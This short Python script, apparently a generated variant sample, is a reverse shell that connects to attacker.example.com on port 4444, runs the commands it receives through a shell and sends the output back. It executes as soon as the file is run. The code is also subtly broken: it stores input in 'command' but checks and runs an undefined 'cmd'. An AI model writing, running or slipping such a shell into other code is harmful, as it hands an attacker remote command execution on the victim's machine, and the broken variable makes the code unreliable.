# Variant 1 - Generated at 2026-03-30T08:16:36.485620

#!/usr/bin/env python3
"""Network call - network_call"""
import socket
import subprocess

# Reverse shell
def reverse_shell():
    host = "attacker.example.com"
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        command = s.recv(1024).decode()
        if cmd == "exit":
            break
        result = subprocess.run(cmd, shell=True, capture_output=True)
        s.send(result.stdout + result.stderr)
    s.close()

reverse_shell()
